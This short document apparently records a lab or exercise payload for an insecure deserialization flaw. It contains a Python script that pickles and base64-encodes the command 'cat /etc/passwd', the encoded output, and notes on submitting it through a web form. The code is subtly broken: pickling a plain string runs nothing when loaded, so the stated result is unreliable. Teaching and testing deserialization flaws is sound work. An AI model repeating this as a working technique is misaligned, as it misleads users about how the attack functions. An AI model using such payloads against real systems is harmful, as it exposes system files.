
This document records the payload used to demonstrate the Insecure Deserialization vulnerability and retrieve the `/etc/passwd` file from the host.



import pickle
import base64


command = "cat /etc/passwd"


payload_bytes = pickle.dumps(command, protocol=3)
result = base64.b64encode(payload_bytes).decode()

print(result)


## Executed Payload
```text
gANYDwAAAGNhdCAvZXRjL3Bhc3N3ZHEALg==
```

## Description
* **Encoding:** Base64
* **Target File:** `/etc/passwd`
* **Execution:** Submitted via the "Enter Serialized Data" input field on the web application interface to achieve command output.
